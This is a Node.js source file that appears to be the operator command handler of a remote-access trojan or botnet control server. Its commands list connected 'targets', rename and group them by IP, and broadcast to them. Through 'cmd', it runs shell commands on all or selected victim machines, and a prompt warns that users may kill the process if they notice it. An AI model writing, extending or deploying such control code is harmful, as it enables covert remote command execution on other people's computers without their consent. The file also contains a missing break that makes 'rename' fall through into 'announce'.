var include = require('./includes.js')

//Import commands here.
var announce = require('./commands/announce.js');
var test = require('./commands/test.js');
var cmdRun = require('./commands/cmd.js');

module.exports.run = async (cmd, socket, group, args, command) => {
  ifthisisnthereitbreaks(command);
  switch (cmd) {
    case "threadtest": {
      include.threading.getData("");
      break;
    }
    case "banner": {
      include.admin.banner(socket);
      break;
    }
    case "help": {
      include.s.write(socket, "\n\rCommands:\n\r   test {group}: prints a message on connections testing them\n\r   announce {group}: Announce your presence :)\n\r   conns: connection viewer\n\r   cmd: run a shell command on the target.\n\r   rename: {oldname} {newname}: Renames a socket\n\r   groups: list all groups\n\r\n\r Example: test all\n\r");
      break;
    }
    case "conns": {
      if (args[1] == "list") {
        include.s.write(socket, "\n\r")
        include.globalVars.connected.forEach(a => {
          include.s.write(socket, `Name: ${a.name} | ${a.remoteAddress} | Admin: ${include.globalVars.admins.has(a.socket)}\n\r`)
        })
      } else if (args[1] == "all") {
        include.s.write(socket, `\r\nConnections: [${include.globalVars.connected.size - include.globalVars.authenticating.size - include.globalVars.admins.size}]\nAuthenticating: [${include.globalVars.authenticating.size}]\nAdmins: [${include.globalVars.admins.size}]`)
      } else {
        include.s.write(socket, "\n\rOptions:\n\r   conns list: Lists all connections and if they are admin\n\r   conns all: gives you a count of all connections and their types\n\r");
      }
      break;
    }
    case "rename": {
      include.globalVars.connected.forEach(a => {
        if (a.name == args[1]) {
          var socketIndentification = {
            socket: a.socket,
            remoteAddress: `${a.remoteAddress}`,
            name: args[2]
          }
          include.globalVars.connected.delete(a);
          include.globalVars.connected.add(socketIndentification);
        }
      })
    }
    case "announce": {
      var data = {
        socket: socket,
        command: cmd,
        args: args
      }
      include.s.write(socket, "Are you sure?\n\r  Running this command will have an extremely high chance of the user terminating the proccess losing the socket. (y/N)\n\r")
      include.globalVars.choiceConfirm.add(data);
      break;
    }
    case "test": {
      groups(args[1]).forEach(a => {
        test.run(a);
      })
      break;
    }
    case "cmd": {
      groups(args[1]).forEach(a => {
        cmdRun.run(a, command, socket);
      })
      break;
    }
    case "groups": {
      thatsNotAGroup(socket);
      break;
    }
    case "": {
      break;
    }
  }
}

module.exports.choice = async (command, args, socket) => {
  switch (command) {
    case "announce": {
      groups(args[1]).forEach(a => {
        announce.run(a);
      })
      break;
    }
  }
}

function ifthisisnthereitbreaks(cmd) {
  console.log(`Admin: ${cmd}`);
}

function thatsNotAGroup(socket) {
  include.s.write(socket, "You need to specify who your targeting.\r\nAvaliable options are:\n\r   all\n\r   admins\n\r   targetIp\n\r");
}

function groups(group){
  var b = new Set();
  switch (group) {
    case "all": {
      include.globalVars.connected.forEach(a => {
        if (!include.globalVars.admins.has(a.socket)) {
          b.add(a.socket)
        }
      })
      break;
    }
    case "admin": {
      include.globalVars.admins.forEach(a => {
        b.add(a.socket)
      })
      break;
    }
    default: {
      //We dont have a catagory for this so we will check if its a specific address and use it that way.
      include.globalVars.connected.forEach(a => {
        switch (group) {
          case a.remoteAddress: {
            b.add(a.socket)
            break;
          }
          case a.name: {
            b.add(a.socket)
            break;
          }
        }
      })
      break;
    }
  }
  return b;
}